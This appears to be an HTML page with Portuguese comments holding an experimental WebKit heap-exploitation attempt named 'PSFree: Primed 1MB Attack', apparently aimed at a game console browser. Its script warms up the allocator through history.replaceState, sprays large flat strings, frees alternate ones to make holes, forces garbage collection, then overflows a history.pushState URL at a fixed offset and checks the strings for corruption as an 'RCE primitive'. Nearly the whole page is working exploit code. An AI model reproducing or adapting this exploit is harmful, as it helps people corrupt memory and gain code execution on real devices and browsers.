<!DOCTYPE html>
<html>
<head>
    <title>PSFree: Primed 1MB Attack</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white;}
    </style>
</head>
<body>

    <h1>PSFree: Primed 1MB Attack</h1>
    <p>Reproduzindo a lógica de aquecimento e construção de string do original.</p>

    <button onclick="startPrimedAttack()">INICIAR ATAQUE PREPARADO</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        // Offset que confirmamos que toca nos dados
        const BASE_OFFSET = 709520; 
        const OVERFLOW_AMT = 1024 * 64; 

        // 1MB Alinhado
        const TARGET_SIZE = 1024 * 1024; 
        // Header de StringImpl (24 bytes)
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

        // Construtor de String estilo PSFree (Garante 8-bit flat string)
        function createPSFreeString(size, index) {
            // Cria um buffer de índices para identificação
            const u32 = new Uint32Array(1);
            u32[0] = index;
            const u8 = new Uint8Array(u32.buffer);
            
            // Padding 'B'
            // Deixamos 4 bytes no final para o índice
            const padLen = size - 4; 
            const pad = "B".repeat(padLen);
            
            // Junta tudo. Isso força o WebKit a criar uma string Flat.
            return [pad, String.fromCodePoint(...u8)].join('');
        }

        async function startPrimedAttack() {
            log("--- FASE 0: AQUECIMENTO (WARMUP) ---");
            
            // 1. PRIMING (A parte que esquecemos)
            // Aloca uma string de 1MB no histórico para "acordar" o alocador correto
            let dummyPayload = "W".repeat(BASE_OFFSET + 100); 
            history.replaceState("warmup", "warmup", "/" + dummyPayload);
            
            log("Alocador aquecido. Iniciando Spray...");
            await sleep(100);

            // 2. SPRAY (Estilo PSFree)
            victims = [];
            const SPRAY_COUNT = 80;

            try {
                for(let i=0; i<SPRAY_COUNT; i++) {
                    // Usa a função específica de construção
                    let s = createPSFreeString(PAYLOAD_SIZE, i);
                    victims.push(s);
                }

                // 3. BURACOS
                log("Criando buracos...");
                for(let i=0; i<SPRAY_COUNT; i+=2) {
                    victims[i] = null;
                }

                await forceGC();

                // 4. EXPLOIT
                log("Disparando Overflow (709520)...");
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(BASE_OFFSET);
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "pwn", "/" + buffer);

                        log("Verificando...");
                        checkCorruption(PAYLOAD_SIZE);

                    } catch (e) {
                        log("Erro: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        function checkCorruption(expectedLen) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    // TRUQUE DO ERROR
                    let err = new Error(s);
                    let msg = err.message;

                    // CHECAGEM DE LENGTH (RCE)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! String ${i} Length: ${msg.length}`, 'win');
                        alert("RCE PRIMITIVE UNLOCKED!");
                        success = true;
                        break;
                    }

                    // CHECAGEM DE DADOS
                    // PSFree verifica se os últimos bytes (o índice) mudaram, ou o começo
                    if (msg.charCodeAt(0) !== 66) { 
                        log(`[DADOS] String ${i} corrompida no início.`, 'win');
                        success = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!success) log("Nada atingido.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
